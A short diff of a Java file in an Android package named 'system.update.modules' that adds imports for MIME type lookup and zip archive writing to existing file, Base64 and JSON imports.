@@ -3,10 +3,14 @@ package com.android.system.update.modules;
 import android.content.Context;
 import android.os.Environment;
 import android.util.Base64;
+import android.webkit.MimeTypeMap;
 
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
+import java.util.zip.ZipEntry;
+import java.util.zip.ZipOutputStream;
+
 import org.json.JSONArray;
 import org.json.JSONObject;
 import org.json.JSONException;
